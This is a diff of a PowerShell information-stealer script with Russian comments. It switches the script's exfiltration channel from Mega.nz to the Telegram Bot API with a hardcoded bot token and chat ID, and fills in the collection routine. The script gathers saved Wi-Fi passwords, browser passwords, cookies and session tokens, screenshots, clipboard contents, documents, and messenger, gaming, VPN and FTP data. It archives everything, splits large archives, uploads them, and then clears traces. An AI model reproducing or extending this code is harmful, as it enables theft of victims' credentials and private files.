@@ -1,6 +1,7 @@
-# --- Настройки Telegram Bot ---
-$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"           # <-- впишите токен
-$YourChatId = "1266539824"             # <-- впишите свой Chat ID (можно узнать у @userinfobot)
+# --- Настройки Telegram ---
+$BotToken = '8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I'
+$YourChatId = '1266539824'
+$MaxPartSize = 50MB  # лимит Telegram
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
@@ -23,68 +24,29 @@ $OutputMessages = @{
     BrowserData  = "[+] Извлечение файлов сессий, паролей и cookies для оффлайн-анализа..."
     Files        = "[+] Поиск и копирование файлов (doc, txt, xls)..."
     Gaming       = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
-    Messengers   = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
+    Messengers   = "[+] Сбор логов мессенджеров..."
     Tokens       = "[+] Поиск токенов авторизации..."
     Screenshot   = "[+] Создание скриншота экрана..."
     Clipboard    = "[+] Копирование данных из буфера обмена..."
     VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
     Archiving    = "[+] Архивирование данных..."
-    Sending      = "[+] Отправка архива в Mega.nz..."
+    Sending      = "[+] Отправка архива в Telegram..."
     Cleaning     = "[+] Очистка следов..."
     Complete     = "Процесс завершен."
 }
 
-# --- Скрытая установка MEGAcmd ---
-function Ensure-MEGAcmd {
-    $exeName = "mega-cmd.exe"
-    $exePath1 = "$env:LOCALAPPDATA\MEGAcmd\$exeName"
-    $exePath2 = "$env:ProgramFiles\MEGAcmd\$exeName"
-    
-    if (!(Test-Path $exePath1) -and !(Test-Path $exePath2)) {
-        Write-Warning "MEGAcmd не найден. Установите его вручную: https://mega.io/cmd"
-        return $false
-    }
-    
-    $env:PATH += ";$env:LOCALAPPDATA\MEGAcmd;$env:ProgramFiles\MEGAcmd"
-    return $true
-}
 
-
-
-# --- Функция отправки файла через Telegram Bot ---
 function Send-TelegramFile {
-    param(
-        [string]$FilePath
-    )
-    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
-    $form = @{
+    param([string]$FilePath,[string]$Caption="")
+    $Url = "https://api.telegram.org/bot$BotToken/sendDocument"
+    $Form = @{
         chat_id = $YourChatId
-        caption = "Лог с этого устройства"
+        caption = $Caption
+        document = Get-Item $FilePath
     }
-    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $fileName = [System.IO.Path]::GetFileName($FilePath)
-
-    $bodyLines = @("--$boundary")
-    $bodyLines += "Content-Disposition: form-data; name=`"chat_id`"`r`n"
-    $bodyLines += ""
-    $bodyLines += "$YourChatId"
-    $bodyLines += "--$boundary"
-    $bodyLines += "Content-Disposition: form-data; name=`"caption`"`r`n"
-    $bodyLines += ""
-    $bodyLines += "Лог с устройства"
-    $bodyLines += "--$boundary"
-    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n"
-    $bodyLines += ""
-    $bodyLines += $fileBytes
-    $bodyLines += "--$boundary--"
-    $body = $bodyLines -join "`r`n"
-
-    Invoke-WebRequest -Uri $url -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+    Invoke-RestMethod -Uri $Url -Method Post -Form $Form
 }
 
-# --- Разделение файла на части ---
 function Split-File {
     param (
         [string]$FilePath,
@@ -94,7 +56,6 @@ function Split-File {
     $files = @()
     $fs = [System.IO.File]::OpenRead($FilePath)
     $part = 1
-
     try {
         while ($fs.Position -lt $fs.Length) {
             $target = "$($FilePath)_part$part.zip"
@@ -104,8 +65,7 @@ function Split-File {
                 $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
                 $buffer = New-Object byte[] $toRead
                 $read = $fs.Read($buffer, 0, $toRead)
-                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
-                else { break }
+                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read } else { break }
             }
             $partStream.Close()
             $files += $target
@@ -122,20 +82,69 @@ function Start-Stealer {
         New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null
     }
     Write-Host $OutputMessages.Start -ForegroundColor Yellow
+
     try {
-        # --- Сбор данных (оставьте как есть) ---
-        # ... Вставьте ваши функции Get-SystemInformation, Get-Screenshot и прочие
+        if ($StealSystemInfo) {
+            Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan
+            Get-SystemInformation -LogPath $LogFolder
+        }
+        if ($TakeScreenshot) {
+            Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan
+            Get-Screenshot -LogPath $LogFolder
+        }
+        if ($GrabClipboard) {
+            Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan
+            Get-ClipboardData -LogPath $LogFolder
+        }
+        if ($StealBrowserData) {
+            Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan
+            $BrowserProfiles = Find-AllBrowserProfiles
+            if ($null -ne $BrowserProfiles) {
+                Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan
+                Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData"
+            }
+        }
+        if ($StealFiles) {
+            Write-Host $OutputMessages.Files -ForegroundColor Cyan
+            Copy-UserFiles -LogPath "$LogFolder\Files"
+        }
+        if ($StealGamingSessions) {
+            Write-Host $OutputMessages.Gaming -ForegroundColor Cyan
+            Get-GamingData -LogPath "$LogFolder\Gaming"
+        }
+        if ($StealMessengerLogs) {
+            Write-Host $OutputMessages.Messengers -ForegroundColor Cyan
+            Get-MessengerData -LogPath "$LogFolder\Messengers"
+        }
+        if ($StealSessionsAndTokens) {
+            Write-Host $OutputMessages.Tokens -ForegroundColor Cyan
+            Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles
+        }
+        if ($StealVpnFtp) {
+            Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
+            Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
+        }
 
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
-
+        
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::CreateFromDirectory($LogFolder, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
 
-        Write-Host "Отправка архива через Telegram..." -ForegroundColor Yellow
+        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
+        $size = (Get-Item $ZipPath).Length
 
-        Send-TelegramFile -FilePath $ZipPath
-
+        if ($size -ge $MaxPartSize) {
+            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
+            $i = 1
+            foreach ($partFile in $parts) {
+                Send-TelegramFile -FilePath $partFile -Caption "Лог part $i $(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') с устройства $env:COMPUTERNAME"
+                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
+                $i++
+            }
+        } else {
+            Send-TelegramFile -FilePath $ZipPath -Caption "Лог с устройства $env:COMPUTERNAME"
+        }
     }
     catch {
         Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
@@ -154,8 +163,6 @@ function Start-Stealer {
     }
 }
 
-# --- Функции сбора данных (оставляю секцию для расширения, пример ниже) ---
-
 function Get-SystemInformation {
     param($LogPath)
     $SysInfoPath = "$LogPath\SystemInfo.txt"
@@ -163,17 +170,15 @@ function Get-SystemInformation {
         $info = Get-ComputerInfo | Select-Object *
         $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
         $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip" -TimeoutSec 5
-
-        "Date: $(Get-Date)"              | Out-File $SysInfoPath -Append -Encoding utf8
-        "Username: $env:USERNAME"        | Out-File $SysInfoPath -Append -Encoding utf8
-        "Computer Name: $env:COMPUTERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
-        "IP Address: $ip"                | Out-File $SysInfoPath -Append -Encoding utf8
-        "Location: $($geo.city), $($geo.country)" | Out-File $SysInfoPath -Append -Encoding utf8
-        "OS: $($info.OsName)"            | Out-File $SysInfoPath -Append -Encoding utf8
-        "CPU: $($info.CsProcessors.Name[0])" | Out-File $SysInfoPath -Append -Encoding utf8
+        "Date: $(Get-Date)"                          | Out-File $SysInfoPath -Append -Encoding utf8
+        "Username: $env:USERNAME"                    | Out-File $SysInfoPath -Append -Encoding utf8
+        "Computer Name: $env:COMPUTERNAME"           | Out-File $SysInfoPath -Append -Encoding utf8
+        "IP Address: $ip"                            | Out-File $SysInfoPath -Append -Encoding utf8
+        "Location: $($geo.city), $($geo.country)"    | Out-File $SysInfoPath -Append -Encoding utf8
+        "OS: $($info.OsName)"                        | Out-File $SysInfoPath -Append -Encoding utf8
+        "CPU: $($info.CsProcessors.Name[0])"         | Out-File $SysInfoPath -Append -Encoding utf8
         "RAM: $([math]::Round($info.OsTotalVisibleMemorySize / 1MB)) MB" | Out-File $SysInfoPath -Append -Encoding utf8
-
-        "--- Network ---"                | Out-File $SysInfoPath -Append -Encoding utf8
+        "--- Network ---"                            | Out-File $SysInfoPath -Append -Encoding utf8
         (netsh wlan show profiles) | ForEach-Object {
             if ($_ -match 'All User Profile\s+:\s(.*)') {
                 $ssid = $matches[1].Trim()
@@ -181,8 +186,7 @@ function Get-SystemInformation {
                 "Wi-Fi: $ssid | Password: $key" | Out-File $SysInfoPath -Append -Encoding utf8
             }
         }
-
-        "--- Installed Programs ---"     | Out-File $SysInfoPath -Append -Encoding utf8
+        "--- Installed Programs ---"                 | Out-File $SysInfoPath -Append -Encoding utf8
         Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table | Out-File $SysInfoPath -Append -Encoding utf8
     } catch {
         "Failed to get full system info: $($_.Exception.Message)" | Out-File $SysInfoPath -Append -Encoding utf8
@@ -403,5 +407,4 @@ function Get-VpnFtpData {
     } catch {}
 }
 
-# --- Запуск основной функции ---
 Start-Stealer
